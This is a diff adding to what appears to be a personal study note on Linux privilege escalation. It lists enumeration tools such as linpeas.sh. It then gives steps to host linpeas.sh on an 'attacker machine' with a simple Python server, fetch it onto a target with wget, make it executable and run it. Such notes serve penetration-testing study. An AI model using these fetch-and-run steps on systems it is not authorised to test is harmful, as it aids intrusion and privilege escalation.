@@ -29,3 +29,21 @@ cmd: netstat -a
 
 find
 step 1)
+
+
+Automated tool
+list
+*linpeas.sh
+*linenum.sh
+*linux exploit suggestor.sh
+1) Linpeas.sh
+need to download to target machine for this file
+Step 1: first download the attacker machine for this file
+Step 2: After start simple server
+cmd: python -m SimpleHTTPServer
+Step 3: open to the target machine download the file
+cmd: wget http://ip/linpeas.sh
+Step 4: After download give to permission
+cmd : chmod +x linpeas.sh
+Step 5 after run the file
+cmd: ./linpeas.sh
